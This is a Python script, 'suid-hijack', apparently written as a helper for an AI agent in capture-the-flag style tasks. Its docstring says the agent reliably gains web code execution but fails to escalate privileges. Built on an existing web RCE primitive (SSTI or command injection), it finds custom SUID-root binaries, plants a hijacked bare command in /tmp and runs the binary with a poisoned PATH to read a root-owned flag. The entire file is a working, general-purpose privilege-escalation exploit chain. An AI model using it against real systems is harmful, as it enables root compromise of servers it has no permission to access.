#!/usr/bin/env python3
"""Deterministic SUID PATH-hijack helper (`suid-hijack`).

The agent reliably gets low-priv web RCE but UNreliably performs the privesc — it re-reads an
unreadable flag instead of escalating. This drives the `web-rce` primitive to do it deterministically:
enumerate SUID-root binaries, find a CUSTOM one that calls another program by BARE NAME (PATH-
hijackable), plant that command in /tmp to read the flag as root, and run the SUID with /tmp on PATH.
General SUID-PATH-hijack tradecraft (not target-specific). Self-contained; shells out to web-rce."""
import argparse
import re
import subprocess
import sys

# Standard SUID binaries that ship with the OS — not the planted vector.
STANDARD_SUID = {
    "su", "sudo", "mount", "umount", "passwd", "chsh", "chfn", "newgrp", "gpasswd",
    "ping", "ping6", "fusermount", "fusermount3", "pkexec", "ntfs-3g", "dbus-daemon-launch-helper",
    "polkit-agent-helper-1", "ssh-keysign", "unix_chkpwd", "chage", "expiry",
}
# Bare commands a privesc helper commonly shells out to (no absolute path -> PATH-hijackable).
HIJACKABLE_CMDS = ["uptime", "ifconfig", "service", "systemctl", "date", "df", "free",
                   "vmstat", "ps", "netstat", "ss", "who", "w", "lsblk", "hostname"]


def pick_custom_suid(find_output: str) -> list:
    """From `find / -perm -4000` output, return the non-standard (likely planted) SUID binaries."""
    out = []
    for line in (find_output or "").splitlines():
        p = line.strip()
        if not p.startswith("/"):
            continue
        if p.rsplit("/", 1)[-1] in STANDARD_SUID:
            continue
        out.append(p)
    return out


def bare_command(strings_output: str) -> str | None:
    """Find a bare (PATH-resolved) command the binary invokes — present as a token, with no slash."""
    toks = set(re.findall(r"[A-Za-z0-9_]+", strings_output or ""))
    abs_paths = " ".join(l for l in (strings_output or "").splitlines() if "/" in l)
    for cmd in HIJACKABLE_CMDS:
        if cmd in toks and f"/{cmd}" not in abs_paths:   # called by bare name, not absolute
            return cmd
    return None


def hijack_script(suid_path: str, bare_cmd: str, flag_path: str) -> str:
    """Shell script that plants the hijack and runs the SUID so it reads the flag as root."""
    return (f"echo /bin/cat {flag_path} > /tmp/{bare_cmd}; chmod 755 /tmp/{bare_cmd}; "
            f"PATH=/tmp:/usr/bin:/bin {suid_path}")


def _webrce(url, param, mode, method, cmd):
    argv = ["web-rce", "--url", url, "--param", param, "--mode", mode, "--method", method, "--cmd", cmd]
    try:
        return subprocess.run(argv, capture_output=True, text=True, timeout=60).stdout
    except Exception as e:
        return f"[suid-hijack: web-rce error: {e}]"


def run(url, param, mode, method, flag_path) -> str:
    find_out = _webrce(url, param, mode, method, "find / -perm -4000 -type f 2>/dev/null")
    customs = pick_custom_suid(find_out)
    if not customs:
        return f"[suid-hijack: no custom SUID found]\n{find_out[:300]}"
    for suid in customs:
        st = _webrce(url, param, mode, method, f"strings {suid} 2>/dev/null")
        detected = bare_command(st)
        # strings is often absent on slim targets -> fall back to TRYING each candidate command.
        candidates = [detected] if detected else list(HIJACKABLE_CMDS)
        for cmd in candidates:
            out = _webrce(url, param, mode, method, hijack_script(suid, cmd, flag_path))
            if re.search(r"GRIN\{[0-9a-fA-F]+\}", out):
                return f"[suid-hijack] {suid} hijacked via bare `{cmd}`:\n{out}"
    return f"[suid-hijack: no hijackable SUID landed] customs={customs}"


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(prog="suid-hijack", description="SUID PATH-hijack via web RCE")
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", default="name")
    ap.add_argument("--mode", choices=["ssti", "cmdi", "auto"], default="auto")
    ap.add_argument("--method", choices=["GET", "POST"], default="GET")
    ap.add_argument("--flag", default="/root/flag.txt")
    a = ap.parse_args(argv)
    print(run(a.url, a.param, a.mode, a.method, a.flag))
    return 0


if __name__ == "__main__":
    sys.exit(main())
